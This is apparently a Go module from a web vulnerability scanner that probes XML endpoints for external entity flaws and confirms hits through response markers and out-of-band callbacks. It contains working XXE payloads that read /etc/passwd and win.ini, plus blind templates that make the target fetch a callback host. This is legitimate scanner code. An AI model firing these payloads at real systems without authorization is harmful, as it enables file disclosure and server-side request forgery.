package xxe_generic

import (
	"fmt"
	"regexp"
	"strings"

	"github.com/pkg/errors"
	"github.com/vigolium/vigolium/pkg/core/hosterrors"
	"github.com/vigolium/vigolium/pkg/dedup"
	"github.com/vigolium/vigolium/pkg/http"
	"github.com/vigolium/vigolium/pkg/httpmsg"
	"github.com/vigolium/vigolium/pkg/modules/infra"
	"github.com/vigolium/vigolium/pkg/modules/modkit"
	"github.com/vigolium/vigolium/pkg/output"
	"github.com/vigolium/vigolium/pkg/utils"
)

// passwdLineRe matches the canonical /etc/passwd root entry: the username "root",
// its password field, then uid and gid both 0. Requiring the ":0:0:" structure —
// not a bare "root:" substring — is what separates a genuine file read from
// coincidental page content: a CSS custom property like "--dxp-g-root:var(...)"
// or a JSON key `"root":` on a catch-all/SPA 404 shell contains "root:" but never
// the full "root:...:0:0:" passwd shape. This was the motivating false positive
// (a Salesforce community 404 shell whose inline CSS carried "--dxp-g-root:").
var passwdLineRe = regexp.MustCompile(`root:[^:\r\n]{0,64}:0:0:`)

// injectionTypeXXE is recorded on the OAST payload context for the blind/OOB
// leg. It contains the word "xxe" so the OAST service classifies the resulting
// callback via oast.classifyXXE (a correlated hit on the unguessable per-payload
// subdomain is itself proof the XML parser resolved the external reference).
const injectionTypeXXE = "xxe (external entity)"

// oobURLToken is the placeholder replaced with the per-payload OAST http:// URL
// in each blind-XXE template. A literal token + strings.ReplaceAll is used rather
// than fmt.Sprintf so the DTD's own '%' parameter-entity syntax needs no escaping.
const oobURLToken = "__VIGOLIUM_OAST__"

// oobXXEPayloads are blind / out-of-band XXE templates. Each references a unique
// per-payload OAST URL; the target's XML parser fetching that external
// entity/DTD (an out-of-band callback to an unguessable subdomain) is unforgeable
// proof it resolves external references, so no in-band marker — and no response
// inspection — is needed. This is the dominant modern XXE case (blind parsers,
// XXE-behind-a-firewall, XXE→SSRF) that the in-band file:// probes above miss.
var oobXXEPayloads = []struct {
	tmpl string
	desc string
}{
	{
		// External general entity referenced in the document body: the parser must
		// dereference the SYSTEM URL to expand &xxe; — also the XXE→SSRF shape.
		tmpl: `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "` + oobURLToken + `">]><root>&xxe;</root>`,
		desc: "external general entity (XXE→SSRF)",
	},
	{
		// External parameter entity dereferenced in the internal subset: the classic
		// blind-XXE shape that fires even when the entity value is never reflected.
		tmpl: `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "` + oobURLToken + `"> %xxe;]><root>ok</root>`,
		desc: "external parameter entity (blind XXE)",
	},
	{
		// XInclude pointing at a remote resource: reaches parsers that disable DTDs
		// but leave XInclude enabled.
		tmpl: `<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="` + oobURLToken + `" parse="text"/></foo>`,
		desc: "XInclude remote fetch",
	},
}

// xxePayload defines an XXE test case. A success is confirmed by a specific
// literal marker (markers) and/or a structural marker (markerRe) appearing in the
// response but NOT in the unfuzzed baseline.
type xxePayload struct {
	payload  string
	markers  []string       // specific literal substrings expected on success
	markerRe *regexp.Regexp // optional structural marker (e.g. /etc/passwd root line)
	desc     string
}

var payloads = []xxePayload{
	{
		payload:  `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>`,
		markerRe: passwdLineRe,
		desc:     "Linux /etc/passwd via file:// entity",
	},
	{
		payload: `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root>&xxe;</root>`,
		markers: []string{"[fonts]", "[extensions]", "for 16-bit"},
		desc:    "Windows win.ini via file:// entity",
	},
	{
		payload: `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe "vigolium-xxe-test-entity">]><root>&xxe;</root>`,
		markers: []string{"vigolium-xxe-test-entity"},
		desc:    "Internal entity expansion",
	},
	{
		payload:  `<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>`,
		markerRe: passwdLineRe,
		desc:     "XInclude file:///etc/passwd",
	},
	{
		payload:  `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>`,
		markerRe: passwdLineRe,
		desc:     "SVG XXE via file:// entity",
	},
}

// Module implements the XXE Generic active scanner.
type Module struct {
	modkit.BaseActiveModule
	rhm dedup.Lazy[dedup.RequestHashManager]
}

// New creates a new XXE Generic module.
func New() *Module {
	m := &Module{
		BaseActiveModule: modkit.NewBaseActiveModule(
			ModuleID,
			ModuleName,
			ModuleDesc,
			ModuleShort,
			ModuleConfirmation,
			ModuleSeverity,
			ModuleConfidence,
			modkit.ScanScopeRequest,
			modkit.AllInsertionPointTypes,
		),
		rhm: dedup.LazyDefaultRHM("xxe_generic"),
	}
	m.ModuleTags = ModuleTags
	return m
}

// CanProcess limits to requests that accept or send XML content.
func (m *Module) CanProcess(ctx *httpmsg.HttpRequestResponse) bool {
	if !m.BaseActiveModule.CanProcess(ctx) {
		return false
	}
	if ctx.Request() == nil {
		return false
	}

	ct := strings.ToLower(ctx.Request().Header("Content-Type"))
	// Process XML content types or requests without a specific content type
	if strings.Contains(ct, "xml") || strings.Contains(ct, "soap") {
		return true
	}

	// Also check Accept header
	accept := strings.ToLower(ctx.Request().Header("Accept"))
	if strings.Contains(accept, "xml") {
		return true
	}

	// Check if body contains XML-like content
	body := ctx.Request().BodyToString()
	if strings.HasPrefix(strings.TrimSpace(body), "<?xml") || strings.HasPrefix(strings.TrimSpace(body), "<") {
		return true
	}

	return false
}

// ScanPerRequest tests the request for XXE vulnerabilities.
func (m *Module) ScanPerRequest(
	ctx *httpmsg.HttpRequestResponse,
	httpClient *http.Requester,
	scanCtx *modkit.ScanContext,
) ([]*output.ResultEvent, error) {
	urlx, err := ctx.URL()
	if err != nil {
		return nil, errors.Wrap(err, "failed to get URL")
	}

	if utils.IsMediaAndJSURL(urlx.Path) {
		return nil, nil
	}

	// Blind / out-of-band leg: plant external-entity payloads referencing unique
	// OAST subdomains. Findings arrive asynchronously via the OAST callback
	// (oast.classifyXXE) — a correlated hit is proof, so there is nothing to
	// inspect in-band here. Fire-and-forget before the in-band probes below.
	m.scanBlindXXE(ctx, httpClient, scanCtx, urlx.String())

	// Get original response body
	var origBody string
	if ctx.Response() != nil {
		origBody = ctx.Response().BodyToString()
	}

	var results []*output.ResultEvent

	for _, p := range payloads {
		// Replace body with XXE payload
		modifiedRaw, err := httpmsg.SetBody(ctx.Request().Raw(), []byte(p.payload))
		if err != nil {
			continue
		}

		// Ensure Content-Type is set to XML
		modifiedRaw, err = httpmsg.AddOrReplaceHeader(modifiedRaw, "Content-Type", "application/xml")
		if err != nil {
			continue
		}

		// AddOrReplaceHeader produces well-formed raw, so wrap directly instead
		// of re-parsing on this hot path.
		fuzzedReq := httpmsg.NewRequestResponseRaw(modifiedRaw, ctx.Service())

		resp, _, err := httpClient.Execute(fuzzedReq, http.Options{})
		if err != nil {
			if errors.Is(err, hosterrors.ErrUnresponsiveHost) {
				return results, nil
			}
			continue
		}

		// A WAF/CDN challenge, auth gate, or rate-limit page is not the app
		// returning file content — skip it so its body can't trip an XXE marker
		// (the SSO/Cloudflare-challenge false-positive class).
		if infra.IsBlockedResponse(resp) {
			resp.Close()
			continue
		}

		// A 404/redirect means the XML endpoint never processed the payload, so no
		// file was read: a marker substring in such a body is page noise (a
		// catch-all/SPA 404 shell), not an XXE leak.
		if !infra.IsErrorSurfaceStatus(resp) {
			resp.Close()
			continue
		}

		body := resp.Body().String()
		if marker := checkXXEMarkers(body, origBody, p); marker != "" {
			results = append(results, &output.ResultEvent{
				URL:              urlx.String(),
				Request:          string(modifiedRaw),
				Response:         resp.FullResponseString(),
				ExtractedResults: []string{marker},
				Info: output.Info{
					Name:        fmt.Sprintf("XXE: %s", p.desc),
					Description: fmt.Sprintf("XXE entity expanded — marker %q found in response", marker),
				},
			})
			resp.Close()
			return results, nil
		}
		resp.Close()
	}

	return results, nil
}

// scanBlindXXE plants the out-of-band external-entity payloads. Each payload gets
// its own unguessable OAST subdomain; the target's XML parser fetching it produces
// a correlated callback that the OAST service turns into a finding (classifyXXE),
// so this sends fire-and-forget and never inspects the (blind) response. A no-op
// when OAST is disabled — the module then relies on its in-band probes alone.
func (m *Module) scanBlindXXE(ctx *httpmsg.HttpRequestResponse, httpClient *http.Requester, scanCtx *modkit.ScanContext, target string) {
	oast := scanCtx.OASTProv()
	if oast == nil || !oast.Enabled() {
		return
	}

	requestHash := ctx.Request().ID()
	for _, p := range oobXXEPayloads {
		host := oast.GenerateURL(target, "body", injectionTypeXXE, ModuleID, requestHash)
		if host == "" {
			return
		}
		payload := strings.ReplaceAll(p.tmpl, oobURLToken, "http://"+host)
		// Record the exact XML planted so the finding reconstructs what went on the
		// wire rather than a bare callback host.
		oast.RecordPayload(host, payload)

		modifiedRaw, err := httpmsg.SetBody(ctx.Request().Raw(), []byte(payload))
		if err != nil {
			continue
		}
		modifiedRaw, err = httpmsg.AddOrReplaceHeader(modifiedRaw, "Content-Type", "application/xml")
		if err != nil {
			continue
		}

		fuzzedReq := httpmsg.NewRequestResponseRaw(modifiedRaw, ctx.Service())
		resp, _, err := httpClient.Execute(fuzzedReq, http.Options{})
		if err != nil {
			if errors.Is(err, hosterrors.ErrUnresponsiveHost) {
				return
			}
			continue
		}
		resp.Close()
	}
}

// checkXXEMarkers checks whether the response body contains an XXE success
// indicator — a specific literal marker or the structural passwd-line marker —
// that is absent from the unfuzzed baseline (so static page content cannot
// produce a false positive). It returns the matched text, or "" for no match.
//
// The injected XML is stripped (modkit.StripReflected) before matching: the
// internal-entity probe embeds its OWN success marker ("vigolium-xxe-test-entity")
// as the entity's literal value, so an endpoint that merely REFLECTS the rejected
// document in an error page (the very 4xx/5xx surfaces this module targets) would
// otherwise echo the marker and self-trigger a High finding with no entity ever
// expanded. A genuine expansion emits the marker where "&xxe;" stood — text that is
// NOT part of the literal payload — so it survives the strip; a raw reflection does not.
func checkXXEMarkers(body, origBody string, p xxePayload) string {
	body = modkit.StripReflected(body, p.payload)
	for _, marker := range p.markers {
		if strings.Contains(body, marker) && !strings.Contains(origBody, marker) {
			return marker
		}
	}
	if p.markerRe != nil {
		if hit := p.markerRe.FindString(body); hit != "" && !p.markerRe.MatchString(origBody) {
			return hit
		}
	}
	return ""
}
